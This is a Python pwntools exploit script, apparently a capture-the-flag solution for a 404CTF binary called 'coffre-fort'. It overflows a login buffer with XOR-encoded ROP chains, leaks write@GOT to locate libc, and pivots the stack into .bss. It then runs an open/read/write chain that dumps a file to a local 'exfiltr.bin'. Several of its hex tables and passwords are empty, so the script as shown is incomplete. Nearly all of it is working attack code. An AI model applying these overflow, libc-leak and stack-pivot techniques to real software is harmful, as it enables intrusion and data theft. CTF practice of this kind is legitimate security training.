#!/usr/bin/env python3

from pwn import *
from time import sleep
import struct

HOST = "challenge.404ctf.fr"
PORT = 30863

exe = ELF("./coffre-fort")
libc = ELF("./libc-2.27.so")

context.log_level = 'info'
context.arch = 'amd64'
context.binary = exe.path
context.terminal = ["terminator", "-e"]

if args.REMOTE:
    NL = b"\r\n"
else:
    NL = b"\n"

def conn():
    if args.REMOTE:
        r = remote(HOST, PORT)
    else:
        r = process([exe.path])

    return r

def attach_gdb():
    if args.GDB:
        gdb.attach(r, gdbscript="""
source ~/.gdbinit
b * 0x40135c
r
        """)




def main():
    global r

    tab_1 = ""

    tab_1 = bytes.fromhex(tab_1)

    tab_2 = ""

    tab_2 = bytes.fromhex(tab_2)

    # tab_1 xor tab_2
    password1 = ""

    password1 = bytes.fromhex(password1)[:0x20]


    #tab_2 += b'\x67\x69\x51\x4a\x29\xba\xf2\xe3\x7c\x54\x1b\xe7\x76\x2e\x33\xc9\x66\x0d\x31\xa3\x25\x05\x58\x5e\xab\xcd\x9b\x54\x0e\x74\x21\xdc\xa8\xe0\xa0\x26\x40\xd6\x9c\xd6'


    tab_3 = ""

    tab_3 = bytes.fromhex(tab_3)

    tab_4 = ""

    tab_4 = bytes.fromhex(tab_4)

    # tab_3 xor tab_4
    password2 = ""

    password2 = bytes.fromhex(password2)[:0x20]


    tab_5 = ""

    tab_5 = bytes.fromhex(tab_5)

    tab_6 = ""

    tab_6 = bytes.fromhex(tab_6)

    password3 = ""

    password3 = bytes.fromhex(password3)[:0x20]

    tab_7 = ""

    tab_7 = bytes.fromhex(tab_7)

    tab_8 = ""

    tab_8 = bytes.fromhex(tab_8)

    password4 = ""

    password4 = bytes.fromhex(password4)[:0x20]

    ret = 0x000000000040101a # ret
    pop_rbp = 0x00000000004011bd # pop rbp ; ret
    pop_rdi = 0x0000000000401643 # pop rdi ; ret
    pop_rsi_r15 = 0x0000000000401641 # pop rsi ; pop r15 ; ret
    edx = 0x000000000040152c  # mov edx, 0x64207a65 ; ret
    pop_rsp = 0x000000000040163d # pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
    
    bss = 0x404060


    # gadget binary
    read_plt = 0x4010a0
    write_plt = 0x401090
    write_got = 0x403fc0
    main = 0x00401377
    read_plt = 0x00000000004010a0
    retf = 0x00000000004012dc

    # gadget libc
    syscall_static = 0x13ff57 # syscall ; ret
    pop_rax_static = 0x000000000001b500 # pop rax ; ret
    pop_rdx_static = 0x0000000000001b96 # pop rdx ; ret
    pop_rbx_static = 0x000000000002c729 # pop rbx ; ret
    mov_rax_static = 0x0000000000043cd7 # mov rax, rbx ; pop rbx ; ret
    mov_rsi_rax_static = 0x000000000014da7e # mov qword ptr [rsi + 8], rax ; ret
    pop_rdx_rsi_static =   0x0000000000130539 # pop rdx ; pop rsi ; ret
    mov_rdx_rax_static = 0x000000000003099c # mov qword ptr [rdx], rax ; ret
    push_rdi_static = 0x0000000000110038 # push rdi ; ret
    push_rsi_static = 0x000000000003e29f # push rsi ; ret
    xor_edi_static = 0x00000000000bcfe2 # xor edi, edi ; mov rax, rdi ; ret
    xor_esi_static = 0x000000000007ec20 # xor esi, esi ; mov rax, rsi ; ret
    pop_rcx_static = 0x00000000000e433e # pop rcx ; ret
    pop_rsi_static = 0x0000000000023a6a # pop rsi ; ret
    mov_rdi_static = 0x00000000000520c9 # mov rdi, qword ptr [rdi + 0x68] ; xor eax, eax ; ret
    mov_rax_rdi_static = 0x00000000000586bd # mov rax, rdi ; ret
    leave_static =0x00000000000547e3 # leave ; ret
    pop_rbp_static = 0x00000000000213e3 # pop rbp ; ret

    jmp_rax = 0x000000000040114c # jmp rax

    write_static = 0x00000000001100f0



    sc1 = p64(pop_rdi)
    sc1 += p64(0x01)
    sc1 += p64(pop_rsi_r15)
    sc1 += p64(write_got)
    sc1 += p64(0xff)
    sc1 += p64(edx)
    sc1 += p64(ret) #align stack
    sc1 += p64(write_plt)
    sc1 += p64(main)


    sc1_xor = b''
    for i in range(len(sc1)):
      sc1_xor += struct.pack("B",(tab_2[0x38+i]^sc1[i]))

    name = b'A' * 8
    name += struct.pack("B",(tab_2[40]^0x37)) #'\x0e'ecraser le compteur de boucle pour pointer sur le saved RIP
    name += b'A' * (0x38 - 0x20 - len(name))
    name += sc1_xor
    name += b'\x00'

    
    name = name + b'A' * (0x80 - len(name))


    r = conn()

    attach_gdb()
    
    rep = r.recvuntil(b'identifiant.\n')
    print(rep)

    r.send(name)
    rep = r.recvuntil(b'passe.\n')
    r.send(password1)
    print(rep)
    log.success("First payload sent")

    rep = r.recv()

    #print(rep)

    write_leak = u64(rep[:8])
    log.success("Leak write leak : " + hex(write_leak))



    offset = write_leak - write_static

    syscall = offset + syscall_static
    pop_rax = offset + pop_rax_static
    pop_rdx = offset + pop_rdx_static
    mov_rax = offset + mov_rax_static
    mov_rsi_rax = offset + mov_rsi_rax_static
    pop_rdx_rsi = offset + pop_rdx_rsi_static
    mov_rdx_rax = offset + mov_rdx_rax_static
    push_rdi = offset + push_rdi_static
    push_rsi = offset + push_rsi_static
    xor_edi = offset + xor_edi_static
    xor_esi = offset + xor_esi_static
    pop_rbx = offset + pop_rbx_static
    pop_rcx = offset + pop_rcx_static
    pop_rsi = offset + pop_rsi_static
    mov_rax_rdi = offset + mov_rax_rdi_static
    mov_rdi = offset + mov_rdi_static
    leave = offset + leave_static
    pop_rbp = offset + pop_rbp_static 



    offset_file_name = 0x00
    offset_file_name2 = offset_file_name + 0x08
    offset_fd = offset_file_name2 + 0x08
    offset_rop = offset_fd + 0x08
    offset_buffer = offset_rop + 0x08 * (328-220-14)
    size_read = 0xc00

    sc2 = p64(bss+0x500) # stak pivoting
    sc2 += p64(pop_rdx_rsi)
    sc2 += p64(0x0)
    sc2 += p64(bss + offset_file_name)
    sc2 += p64(pop_rax)
    sc2 += b'coffre-f' # flag.txt
    sc2 += p64(mov_rsi_rax)
    sc2 += p64(ret)
    sc2 += p64(main)

    #file name end   
    rop = p64(pop_rdx_rsi)      # bss + 0x100
    rop += p64(0x0)             # bss + 0x108
    rop += p64(bss + offset_file_name2 )  # bss + 0x110
    rop += p64(pop_rax)         # bss + 0x118
    rop += b'ort\x00\x00\x00\x00\x00'     # bss + 0x120
    rop += p64(mov_rsi_rax)    # bss + 0x128
    #open
    rop += p64(pop_rdi)	    # bss + 0x130
    rop += p64(bss+8)	    # bss + 0x138
    rop += p64(pop_rsi)	    # bss + 0x140
    rop += p64(0x00)	    # bss + 0x148
    rop += p64(pop_rdx)	    # bss + 0x150
    rop += p64(0x00)	    # bss + 0x158
    rop += p64(pop_rax)	    # bss + 0x160
    rop += p64(0x40000002)	    # bss + 0x168
    rop += p64(syscall)		    # bss + 0x170
    rop += p64(pop_rsi)    # bss + 0x178
    rop += p64(bss + offset_fd)    # bss + 0x180
    rop += p64(mov_rsi_rax)    # bss + 0x188
    #read 1
    #rop += p64(pop_rdi)
    #rop += p64(bss+0x18-0x68)
    #rop += p64(mov_rdi)
    rop += p64(pop_rdi)     # bss + 0x190
    rop += p64(3)
    rop += p64(pop_rsi)      # bss + 0x1a0
    rop += p64(bss+offset_buffer)
    rop += p64(pop_rdx)      # bss + 0x1b0
    rop += p64(size_read)      
    rop += p64(read_plt)    # bss + 0x1c0
    # write 1
    rop += p64(pop_rdi)      # bss + 0x1e0
    rop += p64(0x01)
    rop += p64(pop_rdx_rsi)    # bss + 0x1f0
    rop += p64(size_read)
    rop += p64(bss+offset_buffer)      # bss + 0x200
    rop += p64(write_plt)
    #read 2
    rop += p64(pop_rdi)     # bss + 0x210
    rop += p64(3)
    rop += p64(pop_rsi)    # bss + 0x220
    rop += p64(bss+offset_buffer)
    rop += p64(pop_rdx)      # bss + 0x230
    rop += p64(size_read)
    rop += p64(read_plt)      # bss + 0x240
    # write 2
    rop += p64(pop_rdi)      # bss + 0x250
    rop += p64(0x01)
    rop += p64(pop_rdx_rsi)    # bss + 0x260
    rop += p64(size_read)
    rop += p64(bss+offset_buffer)      # bss + 0x270
    rop += p64(write_plt)
    #read 3    
    rop += p64(pop_rdi)     # bss + 0x280
    rop += p64(3)
    rop += p64(pop_rsi)    # bss + 0x290
    rop += p64(bss+offset_buffer)
    rop += p64(pop_rdx)      # bss + 0x2a0
    rop += p64(size_read)
    rop += p64(read_plt)      # bss + 0x2b0
    # write 3
    rop += p64(pop_rdi)      # bss + 0x2c0
    rop += p64(0x01)
    rop += p64(pop_rdx_rsi)    # bss + 0x2d0
    rop += p64(size_read)
    rop += p64(bss+offset_buffer)      # bss + 0x2e0
    rop += p64(write_plt)
    #read 4   
    rop += p64(pop_rdi)     # bss + 0x2f0
    rop += p64(3)
    rop += p64(pop_rsi)    # bss + 0x300
    rop += p64(bss+offset_buffer)
    rop += p64(pop_rdx)      # bss + 0x310
    rop += p64(size_read)
    rop += p64(read_plt)      # bss + 0x320
    # write 4
    rop += p64(pop_rdi)      # bss + 0x330
    rop += p64(0x01)
    rop += p64(pop_rdx_rsi)    # bss + 0x340
    rop += p64(size_read)
    rop += p64(bss+offset_buffer)      # bss + 0x350
    rop += p64(write_plt)
    #read 5   
    rop += p64(pop_rdi)     # bss + 0x2f0
    rop += p64(3)
    rop += p64(pop_rsi)    # bss + 0x300
    rop += p64(bss+offset_buffer)
    rop += p64(pop_rdx)      # bss + 0x310
    rop += p64(size_read)
    rop += p64(read_plt)      # bss + 0x320
    # write 5
    rop += p64(pop_rdi)      # bss + 0x330
    rop += p64(0x01)
    rop += p64(pop_rdx_rsi)    # bss + 0x340
    rop += p64(size_read)
    rop += p64(bss+offset_buffer)      # bss + 0x350
    rop += p64(write_plt)
    

    sc2_xor = b''
    for i in range(len(sc2)):
      sc2_xor += struct.pack("B",(tab_4[0x30+i]^sc2[i]))

    name2 = b'B' * 8
    name2 += struct.pack("B",(tab_4[40]^0x2f))
    name2 += b'B' * (0x30 - 0x20 - len(name2))
    name2 += sc2_xor
    name2 += b'\x00'

    name2 = name2 + b'B' * (0X80 - len(name2))
 
    rep = r.recvuntil(b'identifiant.\n')
    print(rep)

    r.send(name2)
    rep = r.recvuntil(b'passe.\n')
    print(rep)

    r.send(password2)
    log.success("Second payload sent")


    # call to read, read rop from stdin
    sc3 = p64(pop_rdi)
    sc3 += p64(0x00)
    sc3 += p64(pop_rdx_rsi)
    sc3 += p64(len(rop))
    sc3 += p64(bss+offset_rop)
    sc3 += p64(read_plt)
    sc3 += p64(ret)
    sc3 += p64(main)


    sc3_xor = b''
    for i in range(len(sc3)):
      sc3_xor += struct.pack("B",(tab_6[0x38+i]^sc3[i]))

    name3 = b'C' * 8
    name3 += struct.pack("B",(tab_6[40]^0x37))
    name3 += b'C' * (0x38 - 0x20 - len(name3))
    name3 += sc3_xor
    name3 += b'\x00'

    name3 = name3 + b'C' * (0X80 - len(name3))

    rep = r.recvuntil(b'identifiant.\n')
    print(rep)

    r.send(name3)
    rep = r.recvuntil(b'passe.\n')
    print(rep)

    r.send(password3)
    log.success("Third payload sent")


    r.send(rop)


    sc4 = p64(pop_rsp)
    sc4 += p64(bss+offset_rop-3*8)
    sc4 += p64(0x00)
    sc4 += p64(0x00)
    sc4 += p64(0x00)




    sc4_xor = b''
    for i in range(len(sc4)):
      sc4_xor += struct.pack("B",(tab_8[0x38+i]^sc4[i]))

    name4 = b'C' * 8
    name4 += struct.pack("B",(tab_8[40]^0x37))
    name4 += b'C' * (0x38 - 0x20 - len(name4))
    name4 += sc4_xor
    name4 += b'\x00'

    name4 = name4 + b'C' * (0X80 - len(name4))

    rep = r.recvuntil(b'identifiant.\n')
    print(rep)

    r.send(name4)
    rep = r.recvuntil(b'passe.\n')
    print(rep)

    r.send(password4)
    log.success("Fourth payload sent")

 
    rep = r.recv()
    rep += r.recv()
    rep += r.recv()
    rep += r.recv()
    rep += r.recv()
    print(rep)
    print(len(rep))
    
    with open("exfiltr.bin","wb") as exfiltr:
      exfiltr.write(rep)

if __name__ == "__main__":
    main()
